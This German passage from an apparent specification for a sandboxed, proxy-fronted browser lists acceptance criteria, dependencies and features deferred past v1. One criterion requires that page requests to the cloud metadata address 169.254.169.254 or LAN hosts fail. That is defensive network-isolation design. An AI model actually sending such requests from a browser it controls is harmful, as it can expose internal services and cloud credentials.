  - [ ] AC2 — Eine Seite, die per `fetch` oder WebRTC `169.254.169.254` bzw. einen LAN-Host ansprechen will, scheitert.
  - [ ] AC3 — Chromium akzeptiert keine Zertifikate außer denen der Proxy-Instanz (Test: direkte Verbindung mit fremdem selbstsigniertem Zertifikat scheitert).
- **Abhängigkeiten:** PRX-002, PRX-007, BRW-003, BRW-018 (siehe 09-browser.md)

## Nicht in v1

- **SaaS-Sandbox-Provider** (E2B, Daytona, Modal, Fly) — v2.
- **MicroVMs** als Sandbox-/Runner-Provider — v2 (Community).
